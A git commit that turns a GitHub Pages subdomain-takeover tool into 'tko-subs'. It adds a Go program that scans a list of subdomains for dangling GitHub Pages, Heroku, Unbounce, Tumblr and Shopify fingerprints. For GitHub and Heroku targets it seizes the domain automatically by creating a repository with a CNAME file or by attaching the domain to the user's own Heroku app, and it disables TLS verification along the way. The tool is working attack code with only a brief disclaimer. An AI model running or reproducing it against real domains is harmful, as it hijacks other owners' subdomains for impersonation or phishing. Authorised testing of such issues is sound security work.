3568646683027ef9817c7489b26fc698ec5f20f7
Anshuman Bhartiya <anshuman.bhartiya@gmail.com>
2016-10-06 18:03:25 -0700

    Added Heroku sub takeovers. Added identification for Unbounce, Tumblr and Shopify

--- README.md
+++ README.md
@@ -1,6 +1,15 @@
-# tkogit
+# tko-subs
 
-Takeover Domains that have dangling CNAMES pointing to Github Pages. 
+This tool allows taking over Domains/Subdomains that have dangling CNAMES pointing to:
+
+* Github Pages
+* Heroku Apps
+
+This tool will also tell you potential takeovers for certain CMS websites for which automation has not yet been implemented. This is primarily because there are no readily available GO clients for those websites or they haven't exposed their API to be able to automate domain takeovers. They are:
+
+* Unbounce 
+* Tumblr
+* Shopify 
 
 
 ### Disclaimer: DONT BE A JERK! 
@@ -8,9 +17,9 @@ Takeover Domains that have dangling CNAMES pointing to Github Pages.
 Needless to mention, please use this tool very very carefully. Run it only if you know what you are doing and you are sure you want to take over a domain. I won't be responsible for any consequences. 
 
 
-### Demo
+### Watch the demo here
 
-![Demo](/imgs/in2.gif)
+[![DEMO](https://i.ytimg.com/vi/5i6Vx9f6hIc/2.jpg)](https://youtu.be/5i6Vx9f6hIc)
 
 
 ### Pre-requisites
@@ -19,35 +28,41 @@ We need GO installed. Once you have GO, `go get` the following libraries:
 * go get github.com/anshumanbh/go-github/github
 * go get golang.org/x/oauth2
 * go get github.com/subosito/gotenv
+* go get github.com/bgentry/heroku-go
 
-The next thing we need to do is to add your Github's Personal Access Token to a `.env` file.
-Just add the token to sample-env provided with this repo and rename it to .env
-PS - Make sure the token has the rights to create repositories, references, contents, etc.  
+The next thing we need to do is to add the following values to the `.env` file:
+* Github's Personal Access Token - Make sure this token has the rights to create repositories, references, contents, etc. You can create this token here - https://github.com/settings/tokens
+* Heroku Username and API key
+* Heroku app name - You can create a static app on Heroku with whatever you want to be displayed on its homepage by following the instructions here - https://gist.github.com/wh1tney/2ad13aa5fbdd83f6a489. Once you create that app, just copy paste that app name in the .env file. We will use that app to takeover the domain (with the dangling CNAME to another Heroku app). 
+
+Just add the above values to sample-env provided with this repo and rename it to .env and you should be good to go!
 
 
 ### How to run?
 
 Once you have everything installed, it is as simple as issuing the command:
-`go run /path/to/tokgit.go /path/to/subdomains.txt`
+`go run /path/to/toksubs.go /path/to/subdomains.txt`
 
 
 ### What is going on under the hood?
 
 This will iterate over all the domains in the `subdomains.txt` file and:
 * See if they are reachable. If not, it times out and proceeds to the next domain
-* If they are reachable, it matches the regular expression for dangling Github Pages
+* If they are reachable, it matches the regular expression for dangling Github Pages, Heroku apps, etc. 
 * If it doesn't match, it says `Not found`
-* If the regular expression matches, it tries to:
+* If the regular expression matches, it tries to takeover the domain based on what's needed to takeover the domains in that website. For example, to takeover a Github Page, the code will:
 	* Create a repo
-	* Create a branch in that repo
-	* Upload `CNAME` and `index.html` to that branch in that repo. `CNAME` contains the domain that needs to be taken over. `index.html` contains the text `This domain is temporarily suspended` that is displayed once the domain is taken over. 
+	* Create a branch `gh-pages` in that repo
+	* Upload `CNAME` and `index.html` to the `gh-pages` branch in that repo. Here, `CNAME` contains the domain that needs to be taken over. `index.html` contains the text `This domain is temporarily suspended` that is to be displayed once the domain is taken over. 
 * And, that's it! 
 
 
 ### Future Work
 
-I am planning to make this more generalized by including different usecases like Heroku, S3, Shopify, etc. 
+* Take CMS name and regex from user or .env file and then automatically hook them into the tool to be able to find it
 
 
 ### Credits
-Thanks to Luke Young (@TheBoredEng) for helping me out with the go-github library
+
+Thanks to Luke Young (@TheBoredEng) for helping me out with the go-github library.
+Thanks to Frans Rosen (@fransrosen) for helping me understand the technical details that are required for some of the takeovers.
---
+++ tkosubs.go
@@ -0,0 +1,245 @@
+package main
+
+import (
+	"bufio"
+	"crypto/tls"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net"
+	"net/http"
+	"os"
+	"regexp"
+	"time"
+
+	"github.com/anshumanbh/go-github/github"
+	"github.com/bgentry/heroku-go"
+	"github.com/subosito/gotenv"
+	"golang.org/x/oauth2"
+)
+
+func main() {
+
+	gotenv.Load()
+
+	filepath := os.Args[1]
+
+	f, err := os.Open(filepath)
+
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	defer f.Close()
+
+	scanner := bufio.NewScanner(f)
+
+	for scanner.Scan() {
+		domain := scanner.Text()
+
+		fmt.Println(IsReachable(domain))
+	}
+
+}
+
+func IsReachable(domain string) string {
+	ch := make(chan string, 1)
+	go func() {
+		select {
+		case ch <- check(domain):
+		case <-time.After(5 * time.Second):
+			ch <- "timedout"
+		}
+	}()
+	return <-ch
+}
+
+func check(domain string) string {
+	tr := &http.Transport{
+		Dial: (&net.Dialer{
+			Timeout: 5 * time.Second,
+		}).Dial,
+		TLSHandshakeTimeout: 5 * time.Second,
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+	}
+
+	timeout := time.Duration(5 * time.Second)
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   timeout,
+	}
+
+	istumblr, _ := regexp.MatchString("tumblr", string(domain))
+
+	response, err := client.Get("https://" + domain)
+	if err != nil {
+		fmt.Println("")
+		return "Can't reach the domain " + domain
+	}
+
+	// check if its a tumblr blog page since tumblr deals differently with http vs https
+	// If its tumblr, send the request over http vs https
+	if istumblr {
+		response, err = client.Get("http://" + domain)
+		if err != nil {
+			fmt.Println("")
+			return "Can't reach the domain " + domain
+		}
+	}
+
+	text, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		log.Fatal(err)
+		return "Trouble reading response"
+	}
+
+	cantakeovermatchgithub1, _ := regexp.MatchString("There isn't a GitHub Pages site here.", string(text))
+	cantakeovermatchgithub2, _ := regexp.MatchString("For root URLs (like http://example.com/) you must provide an index.html file", string(text))
+	cantakeovermatchheroku, _ := regexp.MatchString("Heroku | No such app", string(text))
+	cantakeovermatchunbounce, _ := regexp.MatchString("The requested URL / was not found on this server.", string(text))
+	cantakeovermatchtumblr, _ := regexp.MatchString("There's nothing here.", string(text))
+	cantakeovermatchshopify1, _ := regexp.MatchString("Only one step left!", string(text))
+	cantakeovermatchshopify2, _ := regexp.MatchString("Sorry, this shop is currently unavailable.", string(text))
+
+	//TODO: change this to switch statements
+	if cantakeovermatchgithub1 {
+		fmt.Println("")
+		return githubcreate(domain)
+	} else if cantakeovermatchgithub2 {
+		fmt.Println("")
+		return githubcreate(domain)
+	} else if cantakeovermatchheroku {
+		fmt.Println("")
+		return herokucreate(domain)
+	} else if cantakeovermatchunbounce {
+		fmt.Println("")
+		return unbouncecreate(domain)
+	} else if cantakeovermatchtumblr {
+		fmt.Println("")
+		return tumblrcreate(domain)
+	} else if cantakeovermatchshopify1 {
+		fmt.Println("")
+		return shopifycreate(domain)
+	} else if cantakeovermatchshopify2 {
+		fmt.Println("")
+		return shopifycreate(domain)
+	} else {
+		fmt.Println("")
+		return domain + " Not found as dangling for any of the common content hosting websites"
+	}
+}
+
+func githubcreate(domain string) string {
+
+	fmt.Println("Found: Misconfigured Github Page at " + domain)
+	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")
+
+	// Connecting to your Github account using the Personal Access Token
+	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: os.Getenv("token")})
+	tc := oauth2.NewClient(oauth2.NoContext, ts)
+	client := github.NewClient(tc)
+
+	repo := &github.Repository{
+		Name:            github.String(domain),
+		Description:     github.String("testing subdomain takeovers"),
+		Private:         github.Bool(false),
+		LicenseTemplate: github.String("mit"),
+	}
+
+	// Creating a repo
+	repocreate, _, err := client.Repositories.Create("", repo)
+	if _, ok := err.(*github.RateLimitError); ok {
+		log.Println("hit rate limit")
+	}
+
+	reponame := *repocreate.Name
+	ownername := *repocreate.Owner.Login
+	refURL := *repocreate.URL
+	ref := "refs/heads/master"
+
+	// Retrieving the SHA value of the head branch
+	SHAvalue, _, err := client.Repositories.GetCommitSHA1(ownername, reponame, ref, "")
+	if _, ok := err.(*github.RateLimitError); ok {
+		log.Println("hit rate limit")
+	}
+
+	opt := &github.Reference{
+		Ref: github.String("refs/heads/gh-pages"),
+		URL: github.String(refURL + "/git/refs/heads/gh-pages"),
+		Object: &github.GitObject{
+			SHA: github.String(SHAvalue),
+		},
+	}
+
+	// Creating the gh-pages branch using the SHA value obtained above
+	newref, _, err := client.Git.CreateRef(ownername, reponame, opt)
+	if _, ok := err.(*github.RateLimitError); ok {
+		log.Println("hit rate limit")
+	}
+
+	Indexpath := "index.html"
+	CNAMEpath := "CNAME"
+	data := "This domain is temporarily suspended"
+
+	indexfile := &github.RepositoryContentFileOptions{
+		Message: github.String("Adding the index.html page"),
+		Content: []byte(data),
+		Branch:  github.String("gh-pages"),
+	}
+
+	// Creating the index file with the text you want to see when the domain is taken over
+	newfile1, _, err := client.Repositories.CreateFile(ownername, reponame, Indexpath, indexfile)
+	if _, ok := err.(*github.RateLimitError); ok {
+		log.Println("hit rate limit")
+	}
+
+	cnamefile := &github.RepositoryContentFileOptions{
+		Message: github.String("Adding the subdomain to takeover to the CNAME file"),
+		Content: []byte(domain),
+		Branch:  github.String("gh-pages"),
+	}
+
+	// Creating the CNAME file with the domain that needs to be taken over
+	newfile2, _, err := client.Repositories.CreateFile(ownername, reponame, CNAMEpath, cnamefile)
+	if _, ok := err.(*github.RateLimitError); ok {
+		log.Println("hit rate limit")
+	}
+
+	fmt.Println("Branch created at " + *newref.URL)
+	fmt.Println("Index File created at " + *newfile1.URL)
+	fmt.Println("CNAME file created at " + *newfile2.URL)
+
+	return "Please check " + domain + " after a few minutes to ensure that it has been taken over.."
+
+}
+
+func herokucreate(domain string) string {
+	fmt.Println("Found: Misconfigured Heroku app at " + domain)
+	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")
+
+	// Connecting to your Heroku account using the usernamd and the API key provided in the .env file
+	client := heroku.Client{Username: os.Getenv("herokuusername"), Password: os.Getenv("herokuapikey")}
+
+	// Adding the dangling domain as a custom domain for your appname that is retrieved from the .env file
+	// This results in the dangling domain pointing to your Heroku appname
+	client.DomainCreate(os.Getenv("herokuappname"), domain)
+
+	return "Please check " + domain + " after a few minutes to ensure that it has been taken over.."
+}
+
+func unbouncecreate(domain string) string {
+	fmt.Println("Found: Misconfigured Unbounce landing page at " + domain)
+	return "This can potentially be taken over. Unfortunately, the tool does not support taking over Unbounce pages at the moment."
+}
+
+func tumblrcreate(domain string) string {
+	fmt.Println("Found: Misconfigured Tumblr Blog at " + domain)
+	return "This can potentially be taken over. Unfortunately, the tool does not support taking over Tumblr blogs at the moment."
+}
+
+func shopifycreate(domain string) string {
+	fmt.Println("Found: Misconfigured Shopify shop at " + domain)
+	return "This can potentially be taken over. Unfortunately, the tool does not support taking over Shopify shops at the moment."
+	// This can be done 2 ways. If only 1 step left, then maybe just adding the domain to your shop would work
+	// If shop currently unavailable at the domain, then maybe creating a shop and then adding that domain should work
+}
